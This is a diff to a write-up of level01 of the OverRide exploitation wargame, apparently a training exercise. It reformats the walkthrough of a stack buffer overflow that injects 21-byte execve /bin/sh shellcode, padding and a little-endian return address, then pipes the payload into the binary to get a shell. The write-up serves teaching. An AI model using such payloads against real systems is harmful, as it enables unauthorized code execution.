@@ -20,10 +20,11 @@ puts("nope, incorrect password...\n")                                           
 
 Now we just have to write or find a shellcode. On [this website](https://shell-storm.org/shellcode/), we find a lot of ready-to-use shellcodes. [This one](https://shell-storm.org/shellcode/files/shellcode-841.php) corresponds to what we want to do. It is 21 bytes long so we will need to complete our input with 59 bytes of padding in order to reach EIP. We will then pass the address of the local variable so that our shellcode becomes the next instruction in the program. The address must be written in the little endian convention in order to be readable by the computer. 
 
-python -c 'print "dat_wil\n" + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + 59 * "A" + "\xcc\xd6\xff\xff"' > /tmp/exp
+```
+level01@OverRide:~$ python -c 'print "dat_wil\n" + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + 59 * "A" + "\xcc\xd6\xff\xff"' > /tmp/exp
+```
 
-In order to keep the shell open, we add a dash ('-') at the end of the cat command, in order to keep reading on the standard input until it meets an EOF ('^D') character.
-
+In order to keep the shell open, we add a dash ('-') at the end of the cat command, in order to keep reading on the standard input until it meets an EOF ('^D') character:
 ```
 level01@OverRide:~$ cat /tmp/exp - | ./level01 
 ********* ADMIN LOGIN PROMPT *********
